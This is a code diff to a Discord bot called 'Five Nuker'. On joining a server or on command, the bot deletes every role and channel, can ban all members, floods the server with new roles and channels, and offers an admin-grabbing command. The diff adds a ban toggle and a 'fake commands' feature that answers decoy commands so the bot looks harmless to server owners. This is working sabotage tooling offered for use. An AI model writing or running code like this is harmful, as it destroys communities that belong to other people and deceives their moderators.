@@ -8,6 +8,7 @@ import colorama
 from colorama import Fore
 import os
 import fade
+from time import sleep
 
 config = configparser.ConfigParser()
 
@@ -25,18 +26,29 @@ nversion = open('Bin\\curent_version.fnv', 'rb')
 nversion = nversion.read().decode('utf-8')
 os.system("title Five Nuker - v" + nversion + " - Made By G1itch")
 
-ptfc = 'Bin\\cfg.ini'
+ptfc = 'Configs\\main_cfg.ini'
 pti = 'Bin\\icon.PNG'
 cfg = Path(ptfc)
 ic = Path(pti)
+cl = Path('Configs\\list_of_fake_commands.txt')
+cr = Path('Configs\\nuker_reactions_to_fake_commands.txt')
 
-with open('Bin\\icon.PNG', 'rb') as f:
-    icona = f.read()
+
+
+
+
+if not cl.is_file():
+    cnf = open('Configs\\list_of_fake_commands.txt','w+')
+    cnf.close()
+
+if not cr.is_file():
+    cnf = open('Configs\\nuker_reactions_to_fake_commands.txt','w+')
+    cnf.close()
 
 
 if cfg.is_file():
     print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + ' Config founded!')
-    config.read('Bin\\cfg.ini')
+    config.read('Configs\\main_cfg.ini')
     print(f'{Fore.CYAN}[BOT]' + '\033[39m' + 'Starting...')
 else:
     print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Config not found! Creating new config...')
@@ -53,9 +65,11 @@ else:
                          'how much pings per channel do you want?': '60',
                          'how much channels do you want?': '35', 
                          'how much roles do you want?': '40',
-                         'admin role name': 'sh...'}
+                         'admin role name': 'sh...',
+                         'ban people while i nuking the server?': '1'}
     config['Nuker mode'] = {'Mode': '1'}
-    with open('Bin\\cfg.ini', 'w') as cfg_file:
+    config['Fake commands'] = {'Enabled?': '0'}
+    with open('Configs\\main_cfg.ini', 'w') as cfg_file:
             config.write(cfg_file)
     print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
     print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Edit config file in youre folder and try again')
@@ -64,7 +78,8 @@ else:
 
 clear()
 
-
+with open('Bin\\icon.PNG', 'rb') as f:
+    icona = f.read()
 
 prefix = config['BOT_CFG']['prefix'] 
 token = config['BOT_CFG']['token'] 
@@ -81,13 +96,12 @@ howmc = int(config['BOT_CFG']['how much channels do you want?'])
 howmr = int(config['BOT_CFG']['how much roles do you want?'])
 adrn = config['BOT_CFG']['admin role name']
 nuker_mode = str(config['Nuker mode']['Mode'])
-
-
+ban_people = str(config['BOT_CFG']['ban people while i nuking the server?'])
+is_fake_commands_enabled = str(config['Fake commands']['Enabled?'])
 
 intents = Intents.default()
 intents.members = True
 client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.all())
-
 
 
 
@@ -106,6 +120,26 @@ async def rmm():
     print(bot_started_text.center(115))
     print(f'{Fore.MAGENTA}Logged in as {Fore.GREEN}{client.user}!'.center(120))
     
+list_of_fake_commands = open('Configs\\list_of_fake_commands.txt', 'r')
+list_of_fake_commands = list_of_fake_commands.readlines()
+response_to_fake_commands = open('Configs\\nuker_reactions_to_fake_commands.txt', 'r')
+response_to_fake_commands = response_to_fake_commands.readlines()
+
+@client.event
+async def on_message(m):
+    if m.content.startswith(prefix) and is_fake_commands_enabled == '1':
+        for i, line in enumerate(list_of_fake_commands):
+            new_m_content = m.content.replace(prefix, '')
+            if new_m_content in line:
+                await m.channel.send(response_to_fake_commands[i])
+            else:
+                await client.process_commands(m)
+    else:
+        await client.process_commands(m)
+
+@client.event
+async def on_command_error(ctx,error):
+    sleep(1)
 
 @client.event
 async def on_ready():
@@ -121,6 +155,8 @@ async def on_ready():
         await client.change_presence(status=discord.Status.offline)
     await rmm()
 
+
+
 @client.event
 async def on_guild_join(ctx):
     if nuker_mode == '2':
@@ -129,7 +165,8 @@ async def on_guild_join(ctx):
             create_task(killobject(obj=rl))
         for channel in ctx.channels:
             create_task(killobject(obj=channel))
-        create_task(banallmode2(ctx=ctx))
+        if ban_people == '1':    
+            create_task(banallmode2(ctx=ctx))
         for _ in range(howmr):
             create_task(createrole2(ctx))
         for _ in range(howmc):    
@@ -175,11 +212,13 @@ async def start(ctx):
             create_task(killobject(obj=rl))
         for channel in ctx.guild.channels:
             create_task(killobject(obj=channel))
-        create_task(bananaa(ctx=ctx))
+        if ban_people == '1':
+            create_task(bananaa(ctx=ctx))
         for _ in range(howmr):
             create_task(createrole(ctx))
         for _ in range(howmc):    
             create_task(createchannel(ctx,name=chnrln))
+
 
 @client.command()
 async def admin(ctx,target):
@@ -249,6 +288,3 @@ welcome_text = f'{Fore.MAGENTA}Welcome to Five Nuker press enter to start nuker.
 
 input(welcome_text.center(120) + f'{Fore.RESET}')
 login()
-
-
-
